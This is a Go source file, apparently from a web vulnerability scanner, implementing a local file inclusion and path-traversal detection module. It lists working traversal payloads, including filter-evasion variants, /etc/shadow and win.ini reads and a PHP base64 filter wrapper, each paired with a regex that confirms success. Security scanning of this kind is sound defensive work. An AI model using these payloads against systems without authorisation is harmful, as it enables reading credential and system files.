package detect

import (
	"context"
	"regexp"
	"strings"
)

// lfiTargets maps path-traversal probes to the success fingerprint.
var lfiTargets = []struct {
	payload   string
	mustMatch *regexp.Regexp
	title     string
	sev       Severity
}{
	{
		`../../../../../../etc/passwd`,
		regexp.MustCompile(`root:[x*!]:0:0:`),
		"LFI / Path Traversal (etc/passwd)", SeverityHigh,
	},
	{
		`....//....//....//....//....//etc/passwd`,
		regexp.MustCompile(`root:[x*!]:0:0:`),
		"LFI with filter evasion", SeverityHigh,
	},
	{
		`..\/..\/..\/..\/..\/..\/etc/passwd`,
		regexp.MustCompile(`root:[x*!]:0:0:`),
		"LFI (backslash traversal)", SeverityHigh,
	},
	{
		`/etc/passwd`,
		regexp.MustCompile(`root:[x*!]:0:0:`),
		"Absolute Path Read", SeverityHigh,
	},
	{
		`../../../../../../etc/shadow`,
		regexp.MustCompile(`root:\$`),
		"LFI reading /etc/shadow", SeverityCritical,
	},
	{
		`../../../../../../windows/win.ini`,
		regexp.MustCompile(`(?i)\[fonts\]|\[extensions\]`),
		"LFI (Windows win.ini)", SeverityHigh,
	},
	{
		`php://filter/convert.base64-encode/resource=/etc/passwd`,
		regexp.MustCompile(`cm9vdDp4OjA6MDp`), // base64("root:x:0:0:")
		"LFI with PHP filter (base64)", SeverityCritical,
	},
}

// lfiFileParamHints prioritize common file parameters during endpoint-level scans.
var lfiFileParamHints = []string{"file", "path", "page", "include", "template", "doc", "read", "cat", "view", "download", "source", "lang", "module"}

// LFI detects local file inclusion / path traversal, including PHP wrapper
// abuse and filter-evasion encodings.
type LFI struct{}

// Name implements Module.
func (LFI) Name() string { return "lfi" }

// Level implements Module.
func (LFI) Level() Level { return LevelParam }

// Scan implements Module.
func (LFI) Scan(ctx context.Context, s *Scanner, p Point) []Finding {
	var out []Finding
	for _, t := range lfiTargets {
		if ctx.Err() != nil {
			return out
		}
		resp, err := s.Fire(ctx, p, p.Param, t.payload, false, nil)
		if err != nil {
			continue
		}
		m := t.mustMatch.FindString(resp.Body)
		if m == "" {
			continue
		}
		out = append(out, Finding{
			ID:       NewID("lfi", p.URL, p.Param, t.payload),
			Module:   "lfi",
			Title:    t.title,
			Severity: t.sev,
			Endpoint: p.URL,
			Method:   p.Method,
			Param:    p.Param,
			Payload:  t.payload,
			Evidence: Snippet(resp.Body, m, 100),
			PoCURL:   PoCGet(p, t.payload),
			PoCCurl:  CurlFor(p, t.payload),
			Description: "Traversal sequences in the parameter escape the web root and the server returns the contents " +
				"of a host file, proving arbitrary local file read.",
			Remediation: "Allow-list file basenames; chroot/jail file access; reject '..' segments before resolution.",
		})
		// One confirmed read is enough for this parameter.
		return out
	}
	return out
}

// lfiInterestingParams reports whether a param name looks file-ish.
func lfiInterestingParams(name string) bool {
	l := strings.ToLower(name)
	for _, h := range lfiFileParamHints {
		if strings.Contains(l, h) {
			return true
		}
	}
	return false
}

// Windows file fingerprints (kept for future coverage).
var _ = regexp.MustCompile(`(?i)bootmgr`).MatchString
